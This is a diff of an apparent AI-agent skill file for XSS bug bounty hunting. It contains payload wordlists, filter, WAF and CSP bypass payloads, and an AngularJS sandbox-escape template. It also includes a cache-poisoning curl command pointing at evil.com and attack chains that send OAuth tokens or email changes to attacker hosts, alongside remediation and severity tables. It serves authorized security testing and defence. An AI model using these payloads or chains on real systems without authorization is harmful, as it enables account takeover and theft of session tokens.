+   - **Only `<` `>` converted** (quotes raw) -> attribute breakout is still live: `" onmouseover="alert(1)` / `' onmouseover='alert(1)`.
+   - **Nothing converted** -> go straight to the dialog trio with the `'"<>` prefix.
 
 4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.
 
@@ -855,11 +1415,70 @@ $(location
 
 9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.
 
-10. **Attempt stored XSS in profile/metadata fields** — Username, display name, bio/signature, job title, tag/collection/report names, ticket subjects, chat messages — these render in many contexts and often have weaker validation. Store with a unique canary, then walk the full **Stored XSS Playbook** (every render surface, a fresh unauthenticated viewer, sibling endpoints) before claiming it.
+10. **Attempt stored XSS in profile/metadata fields** — Username, display name, bio/signature, job title, tag/collection/report names, ticket subjects, chat messages — walk the full **Stored XSS Playbook** (every render surface, a fresh unauthenticated viewer, sibling endpoints) before claiming it.
 
-11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.
+11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users.
 
-12. **Validate in target browser** — Always confirm in a real browser before reporting, and use `alert(1)`, `confirm(1)`, or `prompt(1)` so the execution produces a visible dialog. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. If `alert` is filtered, retry the same context with `confirm` and `prompt` before abandoning it. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)
+12. **Validate in target browser** — Always confirm in a real browser before reporting, and use `alert(1)`, `confirm(1)`, or `prompt(1)` so the execution produces a visible dialog.
+
+---
+
+## Tiered Payload Wordlist
+
+### Tier 1 — Detection (inert, identifies reflection)
+```
+PROBE_xss_1
+<probe_xss_2>
+"probe_xss_3
+'probe_xss_4
+probe_xss_5</probe>
+probe_xss_6${7*7}
+```
+
+### Tier 2 — Context Confirmation (break out without executing)
+```
+"><x
+'><x
+"><svg
+'><svg
+</script><x
+</title><x
+-->x
+VALUE" x="
+VALUE' x='
+```
+
+### Tier 3 — Harmless Execution Proof (isolated lab only)
+```
+<script>console.log('xss:'+document.domain)</script>
+<img src=x onerror=console.log('xss:'+document.domain)>
+<svg onload=console.log('xss:'+document.domain)>
+<details open ontoggle=console.log('xss:'+document.domain)>
+"><script>console.log('xss:'+document.domain)</script>
+"><img src=x onerror=console.log('xss:'+document.domain)>
+"><svg onload=console.log('xss:'+document.domain)>
+'><script>console.log('xss:'+document.domain)</script>
+'><img src=x onerror=console.log('xss:'+document.domain)>
+";console.log('xss:'+document.domain)//
+';console.log('xss:'+document.domain)//
+`+console.log('xss:'+document.domain)+`
+${console.log('xss:'+document.domain)}
+javascript:console.log('xss:'+document.domain)
+</script><img src=x onerror=console.log('xss:'+document.domain)>
+</title><script>console.log('xss:'+document.domain)</script>
+</textarea><script>console.log('xss:'+document.domain)</script>
+--><script>console.log('xss:'+document.domain)</script>
+```
+
+### Tier 4 — Encoding Bypass Variants
+```
+%3Cscript%3Econsole.log(1)%3C/script%3E
+%22%3E%3Cscript%3Econsole.log(1)%3C/script%3E
+&#x3C;script&#x3E;console.log(1)&#x3C;/script&#x3E;
+\u003cscript\u003econsole.log(1)\u003c/script\u003e
+<SCript>console.log(1)</SCript>
+java&#x09;script:console.log(1)
+```
 
 ---
 
@@ -879,9 +1498,8 @@ aaa"bbb'ccc<ddd>eee`fff
 ?utm_source='"<><svg onload=alert(1)>
 ?redirect=javascript:alert(1)
 ```
-The `'"<>` prefix is the default balance probe (see Autonomous Testing Priority); keep it on the script/SVG payloads. Swap `alert` → `confirm` → `prompt` when a blacklist blocks the previous one; the surrounding breakout stays identical.
 
-**Balanced breakout (default — quote + bracket balancing):**
+**Balanced breakout (default):**
 ```html
 '"<><script>alert(1)</script>
 '"<><script>confirm(1)</script>
@@ -897,7 +1515,6 @@ The `'"<>` prefix is the default balance probe (see Autonomous Testing Priority)
 '"<><script>\u0061lert(1)</script>
 '"<><script>eval(atob('YWxlcnQoMSk='))</script>
 ```
-Use the entity rows in HTML/attribute sinks, the `\u0061`/`eval` rows in script sinks; see Dialog Fallback for the full family table.
 
 **Attribute context escapes:**
 ```html
@@ -938,13 +1555,6 @@ plantuml
 ```
 ````
 
-**DOM XSS via hash/search:**
-```javascript
-// In browser console to test sink
-location.hash = '#"><img src=x onerror=alert(1)>'
-location.href = 'https://target.com/page#<script>alert(1)</script>'
-```
-
 **Grep patterns for source review:**
 ```bash
 # Find dangerous sinks in JS
@@ -952,9 +1562,6 @@ grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|locati
 
 # Find unsafe Rails helpers
 grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"
-
-# Find reflected params in responses
-grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
 ```
 
 **Curl to detect reflection:**
@@ -963,101 +1570,94 @@ curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
 curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
 ```
 
-**Cache poisoning test:**
-```bash
-# Send payload then fetch with clean session to see if cached
-curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
-curl -sk "https://target.com/page" | grep -i "evil.com"
-```
+---
+
+## False Positive Elimination
+
+| Check | Test | Positive = NOT XSS |
+|---|---|---|
+| HTML-entity encoding | Submit `<img>`, check response for `&lt;img&gt;` | Value is fully encoded |
+| Text-only rendering | Inspect DOM in DevTools | Value is in a Text node, not an Element |
+| JSON Content-Type | Check `Content-Type` header | `application/json` + `nosniff` present |
+| `Content-Disposition: attachment` | Check response headers | Browser downloads, doesn't render |
+| CSP blocking | Check CSP header, test without CSP | Blocked AND no bypass path |
+| Self-XSS | Can the crafted URL be sent to another user? | Only the attacker can trigger it |
+| Scanner false positive | Open URL in real browser | No actual DOM change or execution |
+| Inert context | In `<template>`, HTML comment, or PLAINTEXT? | No escape path exists |
 
 ---
 
-## Common Root Causes
+## Root Cause Classification
 
-1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.
+| Code | Root Cause | Fix |
+|---|---|---|
+| RC-1a | No encoding applied | Apply context-specific encoder |
+| RC-1b | Wrong context encoding (HTML encode in JS string) | Use JS string encoder |
+| RC-1c | Partial encoding (`<` and `>` encoded, `"` and `'` not) | Encode all dangerous characters |
+| RC-1d | Inconsistent encoding (error template unencoded) | Apply encoding to ALL templates |
+| RC-2a | Validation before decoding (double-encoding bypass) | Validate after all decoding |
+| RC-2b | Encoding reversed by client (innerHTML) | Use `textContent` on client |
+| RC-2c | Unicode normalization after validation | Normalize before validating |
+| RC-3a | Intentional raw output (dangerouslySetInnerHTML, v-html) | Sanitize with DOMPurify before raw output |
+| RC-4a | Sanitizer not called on all paths | Add sanitizer call on all paths |
+| RC-4b | Sanitizer bypassed (mXSS, namespace confusion) | Update DOMPurify to latest |
+| RC-5a | WAF/app parser differential | Normalize at WAF layer |
+| RC-6a | CRLF injection | Strip CRLF from all header values |
+| RC-7a | Framework serialization bug | Update framework |
+| RC-8a | Debug mode in production | Disable debug mode |
 
-2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.
-
-3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.
-
-4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.
-
-5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.
-
-6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).
-
-7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.
-
-8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.
-
-9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.
-
-10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.
+**Common contributing patterns:**
+1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization.
+2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS opportunities.
+3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed.
+4. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript.
+5. **`javascript:` scheme not blocked in href/src** — Link renderers fail to block `javascript:` URLs in href attributes.
+6. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads.
+7. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input.
 
 ---
 
-## Bypass Techniques
+## Severity Assessment
 
-**CSP Bypass:**
-- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
-- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
-- Use `<base>` tag injection to redirect script sources
-- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
-- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies
+**CVSS 3.1 baseline:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
 
-**Sanitizer Bypasses:**
-- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
-- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
-- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
-- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
-- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`
+| Factor | Increases Severity | Decreases Severity |
+|---|---|---|
+| Authentication context | Authenticated page | Public-only page |
+| CSP | No CSP or `unsafe-inline` | Strict nonce-based CSP |
+| Cookie flags | Session cookie lacks `HttpOnly` | `HttpOnly` set |
+| SameSite | `SameSite=None` | `SameSite=Lax` or `Strict` |
+| User interaction | `onload`, `onerror` auto-fire | Requires specific keypress |
+| Chaining | + cache poisoning = effectively stored XSS | Standalone reflected only |
 
-**Filter Evasion:**
-```html
-<!-- Case variation — full rotation lists in "Tag-Name Case Variations" -->
-<ScRiPt>alert(1)</ScRiPt>
-<IMG SRC=x OnErRoR=alert(1)>
-<SvG/OnLoAd=alert(1)>
-```
-<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
-<scr\x00ipt>alert(1)</scr\x00ipt>
-<!-- Tag breaking -->
-<svg/onload=alert(1)>
-<!-- Event handler alternatives -->
-<body onpageshow=alert(1)>
-<input autofocus onfocus=alert(1)>
-<details open ontoggle=alert(1)>
-```
+---
 
-**WAF Bypass:**
+## Remediation
+
+### Context-Specific Output Encoding
+
+| Output Context | Required Encoding | Language Examples |
+|---|---|---|
+| HTML body | `< -> &lt;`, `> -> &gt;`, `& -> &amp;`, `" -> &quot;`, `' -> &#x27;` | PHP: `htmlspecialchars()`, Python/Jinja2: auto-escape, Java: OWASP Encoder |
+| HTML attribute (quoted) | Same as HTML body, always use quotes around attribute values | Same as above |
+| JavaScript string | `' -> \'`, `" -> \"`, `\ -> \\`, newlines -> `\n`, prevent `</script>` | PHP: `json_encode()`, Python: `json.dumps()`, Java: OWASP `forJavaScript()` |
+| URL parameter | `< -> %3C`, `" -> %22` | PHP: `urlencode()`, Python: `urllib.parse.quote()`, JS: `encodeURIComponent()` |
+| Inline JSON in `<script>` | JSON encode + replace `<` with `\u003C` | Use framework-native serialization |
+
+### Safe DOM APIs
+
 ```javascript
-// Obfuscated payloads
-<svg onload=eval(atob('YWxlcnQoMSk='))>
-// String splitting
-<script>ale\u0072t(1)</script>
-// HTML5 event handlers that WAFs miss
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-```
+// SAFE
+element.textContent = userValue;
+document.createTextNode(userValue);
+element.setAttribute('data-x', userValue);  // safe attributes only
 
-**Redirect-based XSS bypass:**
+// UNSAFE - avoid
+element.innerHTML = userValue;
+element.outerHTML = userValue;
+document.write(userValue);
+element.insertAdjacentHTML('beforeend', userValue);
 ```
-?next=javascript://%0aalert(1)
-?next=javascript&colon;alert(1)
-?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
-```
-
-**AngularJS client-side template injection (CSTI) & sandbox escapes:**
-- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
-- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
-  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
-  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
-    ```
-    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
-    ```
-    - `PARAM` = the reflected parameter you found.
-    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
-- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.
 
 ---
 
@@ -1066,98 +1666,85 @@ curl -sk "https://target.com/page" | grep -i "evil.com"
 Before writing the report, answer all three:
 
 1. **What can the attacker DO right now?**
-   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").
+   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access.
 
 2. **What does the victim LOSE?**
-   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.
+   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation).
 
 3. **Can it be reproduced in 10 minutes from scratch?**
-   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.
+   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration.
 
 ---
 
 ## Real Impact Examples
 
 **Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
-An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.
+An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale.
 
 **Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
-A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.
+A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer.
 
 **Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
-A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.
+A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context.
 
 ---
 
 ## Chains & Compositions (Senior Hunting)
 
-XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.
+XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil.
 
-### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)
+### Chain 1 — Reflected XSS + Cache Poisoning -> Persistent Stored XSS at CDN Scale
 
-- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
+- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable.
 - **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
 - **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
 - **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
-- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.
 
-### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO
+### Chain 2 — Self-XSS + CSRF Trigger -> Effective Stored XSS -> ATO
 
 - **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
-- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
-- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
-- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
-- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).
+- **B.** Find a CSRF-vulnerable endpoint that mutates that field.
+- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page -> CSRF fires -> victim's profile updated -> victim's next visit to their own profile executes attacker JS.
+- **Impact:** Self-XSS that "doesn't pay" becomes ATO.
 
-### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO
+### Chain 3 — DOM XSS on /signin or /oauth Callback -> Fragment Token Capture -> ATO
 
 - **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
 - **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
 - **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
-- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
-- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.
+- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data.
 
-### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft
+### Chain 4 — SVG Upload XSS + CSP Bypass -> JS Execution on Trusted Origin -> Cookie/Token Theft
 
 - **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
-- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
+- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses.
 - **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
-- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
-- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).
+- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely.
 
-### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO
+### Chain 5 — postMessage XSS + Origin Check Bypass -> Cross-Origin Token Exfil -> ATO
 
 - **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
 - **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
 - **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
-- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
-- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.
+- **Impact:** Cross-origin JS execution and exfil with no CSP violation.
 
-### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS
+### Chain 6 — Markdown/Wiki XSS + Privileged Viewer -> Cross-Privilege Stored XSS
 
-- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
+- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist.
 - **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
 - **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
-- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
-- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).
+- **Impact:** Privilege escalation from low-priv user to admin via stored XSS.
 
 ### Operator-level pattern
 
 When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.
 
-Cross-references:
-- `hunt-cache-poison` — Chain 1
-- `hunt-csrf` — Chain 2
-- `hunt-oauth` — Chains 3, 5
-- `hunt-file-upload` / `hunt-xxe` — Chain 4
-- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5
-
 ---
 
 ## Related Skills & Chains
 
-- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
-- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
-- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
-- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.
+- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com.
+- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio -> fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin -> silent email takeover -> password reset -> full ATO.
+- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs.
+- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads.
+- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded in the response body.
